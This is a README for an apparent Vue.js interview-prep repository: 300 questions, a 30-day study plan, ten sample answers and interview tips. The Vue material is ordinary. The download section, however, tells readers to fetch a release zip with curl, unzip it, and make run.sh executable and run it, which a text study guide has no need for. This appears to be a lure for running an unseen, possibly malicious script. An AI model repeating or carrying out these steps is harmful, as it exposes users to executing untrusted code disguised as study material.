About
This repo collects 300 Vue.js interview questions and answers. It covers Vue 2 and Vue 3. It includes core topics: reactivity, lifecycle, templates, Composition API, Vuex, routing, testing, performance, and common patterns. The content aims to help developers prepare for junior to senior roles. Use it to study, mock interview, and build quick notes.

What you get
- 300 focused questions with short, clear answers.
- Grouped topics for targeted study.
- Code snippets and small examples.
- Cheat sheets for common tasks.
- A study plan to prepare in 30 days.
- A simple mock-interview checklist.

How to download and run the release
The releases page hosts packaged assets. Download the release asset and execute the included script or open the files.

1) Visit the releases page:
   - https://github.com/0-0xvs/vuejs-interview-questions-master/releases

2) Download a release asset (example names vary). A common file name looks like:
   - vuejs-interview-questions-master-v1.0.zip

3) Example commands for a typical Unix-like system:
   - curl -L -o vuejs-qna.zip "https://github.com/0-0xvs/vuejs-interview-questions-master/releases/download/v1.0/vuejs-interview-questions-master-v1.0.zip"
   - unzip vuejs-qna.zip
   - cd vuejs-interview-questions-master

4) After extraction, check for an executable script or the top-level README:
   - ls -la
   - If you find run.sh or install.sh, make it executable and run:
     - chmod +x run.sh
     - ./run.sh

The releases page may contain direct assets or zipped content. Download the release file and execute the provided script or open the packaged README to get started. If the link fails or an asset is missing, visit the Releases section on the repository page to find the right file.

Study plan (30-day plan)
This plan splits the 300 questions into focused blocks. Each day needs 30â€“60 minutes.

Week 1 â€” Core concepts
- Day 1: Vue instance and lifecycle hooks.
- Day 2: Template syntax and directives (v-bind, v-if, v-for).
- Day 3: Reactivity basics: data, computed, watchers.
- Day 4: Events and methods.
- Day 5: Components: props, emits, slots.
- Day 6: Component communication patterns.
- Day 7: Review and mock quiz 1 (50 questions).

Week 2 â€” State and routing
- Day 8: Vue Router basics and dynamic routing.
- Day 9: Vuex state management concepts.
- Day 10: Modules, getters, actions, mutations.
- Day 11: Alternative state patterns: provide/inject, Composition API state.
- Day 12: Form handling and validation basics.
- Day 13: Asynchronous data fetching and lifecycle interplay.
- Day 14: Review and mock quiz 2 (50 questions).

Week 3 â€” Advanced APIs and testing
- Day 15: Composition API (setup, ref, reactive, toRefs).
- Day 16: WatchEffect and lifecycle in Composition API.
- Day 17: Custom directives and render functions.
- Day 18: Performance patterns and lazy loading.
- Day 19: Unit testing with Vue Test Utils and Jest.
- Day 20: E2E testing with Cypress.
- Day 21: Review and mock quiz 3 (50 questions).

Week 4 â€” Patterns, debugging, and interview prep
- Day 22: Component libraries and accessibility.
- Day 23: SSR basics and Nuxt.js overview.
- Day 24: Debugging, devtools, and profiling.
- Day 25: Design patterns and architecture for large apps.
- Day 26: Common interview whiteboard tasks.
- Day 27: Behavioral and system-design prep for frontend roles.
- Day 28: Full mock interview (100 questions).
- Day 29â€“30: Final polish, flashcards, and notes.

Sample questions and model answers
This sample set gives style and depth. Use them as templates for the rest.

1) What is the Vue reactivity system?
- Answer: Vue tracks dependencies at render. For Vue 2, it uses Object.defineProperty to add getters and setters. For Vue 3, it uses Proxies to wrap objects. Reactive refs update the DOM when their value changes.

2) When does updated() run?
- Answer: updated() runs after the component and its children re-render. Use it for DOM post-processing that depends on the updated DOM.

3) How do props flow and how do you validate them?
- Answer: Props flow down from parent to child. Validate types with the props option: props: { title: String, count: { type: Number, required: true } }.

4) Difference between computed and watch?
- Answer: computed caches based on dependencies and returns values for templates. watch reacts to changes and runs side effects. Use computed for derived state, watch for async or imperative tasks.

5) How to share state between components without Vuex?
- Answer: Use provide/inject for parent-child hierarchies. Use a shared reactive object or Composition API composable for global state. Use an event bus sparingly.

6) Explain Composition API briefly.
- Answer: Composition API organizes logic into reusable functions. Use setup() to declare refs, reactive objects, and lifecycle hooks. It improves code reuse and type inference.

7) How do you test a component that emits an event?
- Answer: Mount the component with Vue Test Utils, trigger the user action, and assert wrapper.emitted() contains the event and payload.

8) How to lazy-load a route?
- Answer: Use dynamic import in the route config: component: () => import('./views/MyView.vue'). This creates separate chunks for better load time.

9) When to use v-for key and why?
- Answer: Always provide a stable key to help Vue track identity during updates. Use unique ids, not array indices, to avoid rendering bugs.

10) How to optimize a large list?
- Answer: Use virtualization, pagination, and lazy components. Avoid deep component trees. Use v-once for static parts.

Interview tips
- Speak clearly about trade-offs. State pros and cons.
- For coding tasks, write readable code. Explain your thought process.
- Use small examples to show patterns. Show a working mental model.
- When unsure, describe how you would test or verify your approach.
- Keep answers concise and focused on the core issue.
